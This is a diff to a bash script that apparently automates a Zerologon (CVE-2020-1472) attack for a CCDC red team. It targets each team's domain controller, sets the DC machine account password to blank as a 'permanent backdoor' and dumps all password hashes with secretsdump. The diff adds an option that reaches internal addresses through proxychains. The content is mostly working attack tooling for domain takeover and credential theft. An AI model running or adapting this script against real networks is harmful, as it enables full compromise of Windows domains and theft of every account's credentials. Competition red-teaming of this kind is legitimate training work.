@@ -1,7 +1,7 @@
 #!/bin/bash
 # ================================================
 # CCDC Zerologon Auto-Runner (dirkjanm CVE-2020-1472)
-# Targets: CURIOSITY$ on every team's DC (192.168.20X.140)
+# Targets: CURIOSITY$ on every team's DC (192.168.20X.140 / 172.16.3.140)
 # Sets DC machine account password to blank → permanent backdoor
 #
 # Uses an isolated venv so system impacket is never touched.
@@ -11,6 +11,7 @@
 #   -d    After exploit, dump all hashes via secretsdump (always tries even on failure)
 #         Output: team<N>_<HHMMSS>.txt
 #   -jd   Just dump hashes (skip exploit entirely — DC must already be zeroed)
+#   -x    Use internal 172.16.x.x IPs (via proxychains)
 # ================================================
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -20,20 +21,23 @@ RESTORE="${SCRIPT_DIR}/restorepassword.py"
 
 DUMP=0
 JUST_DUMP=0
+USE_INTERNAL=0
 
 # Parse flags before positional arg (manual loop — getopts can't handle -jd)
 while [[ "$1" == -* ]]; do
   case "$1" in
     -d)   DUMP=1; shift ;;
     -jd)  JUST_DUMP=1; DUMP=1; shift ;;
+    -x)   USE_INTERNAL=1; shift ;;
     *)    echo "[-] Unknown flag: $1"; break ;;
   esac
 done
 
 if [[ $# -ne 1 ]]; then
-  echo "Usage: $0 [-d|-jd] <team_number | all>"
+  echo "Usage: $0 [-d|-jd] [-x] <team_number | all>"
   echo "   -d          dump hashes after exploit (always tries even if exploit failed)"
   echo "   -jd         just dump hashes — skip exploit (DC must already be zeroed)"
+  echo "   -x          use internal 172.16.x.x IPs (via proxychains)"
   echo "   e.g. $0 5"
   echo "   e.g. $0 -d 5        # exploit + dump team 5"
   echo "   e.g. $0 -d all      # exploit + dump teams 1-5"
@@ -146,7 +150,12 @@ dump_hashes() {
 # ============== RUN ZEROLOGON ==============
 zerologon_team() {
   local TEAM="$1"
-  local DC_IP="192.168.20${TEAM}.140"
+  local DC_IP
+  if [[ $USE_INTERNAL -eq 1 ]]; then
+    DC_IP="172.16.3.140"
+  else
+    DC_IP="192.168.20${TEAM}.140"
+  fi
   local DC_NAME="CURIOSITY"
   local DOMAIN="aperturesciencelabs.org"
 
@@ -196,7 +205,11 @@ if [[ $JUST_DUMP -eq 1 ]]; then
   if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
     echo "[*] Dumping hashes for ALL teams (1-5) — no exploit..."
     for t in {1..5}; do
-      DC_IP="192.168.20${t}.140"
+      if [[ $USE_INTERNAL -eq 1 ]]; then
+        DC_IP="172.16.3.140"
+      else
+        DC_IP="192.168.20${t}.140"
+      fi
       echo ""
       echo "[+] ================================================"
       echo "[+] Just-Dump → TEAM ${t} | ${DC_IP}"
@@ -211,7 +224,11 @@ if [[ $JUST_DUMP -eq 1 ]]; then
     if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
       echo "[-] Invalid team number"; exit 1
     fi
-    DC_IP="192.168.20${ARG}.140"
+    if [[ $USE_INTERNAL -eq 1 ]]; then
+      DC_IP="172.16.3.140"
+    else
+      DC_IP="192.168.20${ARG}.140"
+    fi
     echo ""
     echo "[+] ================================================"
     echo "[+] Just-Dump → TEAM ${ARG} | ${DC_IP}"
